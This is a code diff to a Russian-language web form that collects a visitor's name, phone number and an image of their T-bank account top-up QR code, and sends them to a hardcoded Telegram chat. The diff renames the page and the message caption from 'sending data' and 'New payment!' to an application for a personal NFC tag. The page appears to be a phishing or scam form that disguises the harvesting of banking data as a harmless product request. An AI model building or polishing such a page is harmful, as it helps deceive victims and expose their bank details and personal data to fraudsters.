@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Отправка данных в Telegram</title>
+    <title>Заявка на личную NFC-метку</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -21,6 +21,7 @@
         h1 {
             color: #2c3e50;
             text-align: center;
+            margin-bottom: 25px;
         }
         .form-group {
             margin-bottom: 20px;
@@ -49,16 +50,28 @@
             width: 100%;
             font-size: 16px;
             transition: background-color 0.3s;
+            margin-top: 10px;
         }
         button:hover {
             background-color: #2980b9;
         }
         .instruction {
             background-color: #f8f9fa;
-            padding: 15px;
+            padding: 20px;
             border-radius: 5px;
-            margin-bottom: 20px;
+            margin: 25px 0;
             border-left: 4px solid #3498db;
+        }
+        .instruction h3 {
+            margin-top: 0;
+            color: #2c3e50;
+        }
+        .instruction ol {
+            padding-left: 20px;
+            margin-bottom: 0;
+        }
+        .instruction li {
+            margin-bottom: 8px;
         }
         .preview {
             margin-top: 20px;
@@ -68,7 +81,7 @@
             max-width: 200px;
             max-height: 200px;
             display: none;
-            margin: 0 auto;
+            margin: 15px auto;
             border: 1px solid #eee;
             border-radius: 5px;
         }
@@ -99,24 +112,20 @@
             border-radius: 3px;
             cursor: pointer;
         }
+        .section-title {
+            font-size: 1.2em;
+            color: #3498db;
+            margin: 25px 0 15px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Заявка на личную nfc-метку</h1>
+        <h1>Заявка на личную NFC-метку</h1>
         
-        <div class="instruction">
-            <h3>Как получить QR-код из Т-банка:</h3>
-            <ol>
-                <li>Откройте Т-банк</li>
-                <li>Перейдите в раздел "Счет"</li>
-                <li>Прокрутите вниз до раздела "Пополнение"</li>
-                <li>Найдите кнопку "QR-код для пополнения"</li>
-                <li>Нажмите "Отправить QR-код"</li>
-                <li>Сохраните изображение в файлы</li>
-            </ol>
-        </div>
-
+        <div class="section-title">Ваши данные</div>
         <form id="paymentForm">
             <div class="form-group">
                 <label for="name">Ваше имя:</label>
@@ -131,14 +140,27 @@
             <div class="form-group">
                 <label for="qrCode">QR-код из Т-банка:</label>
                 <input type="file" id="qrCode" name="qrCode" accept="image/*" required>
-            </div>
-            
-            <div class="preview">
-                <img id="qrPreview" alt="Предпросмотр QR-кода">
+                <div class="preview">
+                    <img id="qrPreview" alt="Предпросмотр QR-кода">
+                </div>
             </div>
             
             <button type="submit">Отправить данные в Telegram</button>
         </form>
+
+        <div class="section-title">Инструкция по получению QR-кода</div>
+        <div class="instruction">
+            <h3>Как получить QR-код из Т-банка:</h3>
+            <ol>
+                <li>Откройте приложение Т-банка</li>
+                <li>Перейдите в раздел "Счет"</li>
+                <li>Прокрутите вниз до раздела "Пополнение"</li>
+                <li>Найдите кнопку "QR-код для пополнения"</li>
+                <li>Нажмите "Отправить QR-код"</li>
+                <li>Сохраните изображение в файлы</li>
+                <li>Загрузите сохраненный файл в форму выше</li>
+            </ol>
+        </div>
 
         <div id="statusMessage"></div>
     </div>
@@ -187,7 +209,7 @@
                 // Подготовка данных
                 const formData = new FormData();
                 formData.append('chat_id', '283280949');
-                formData.append('caption', `Новый платеж!\nИмя: ${name}\nТелефон: ${phone}`);
+                formData.append('caption', `Новая заявка на NFC-метку!\nИмя: ${name}\nТелефон: ${phone}`);
                 formData.append('photo', qrFile);
 
                 // Отправка в Telegram
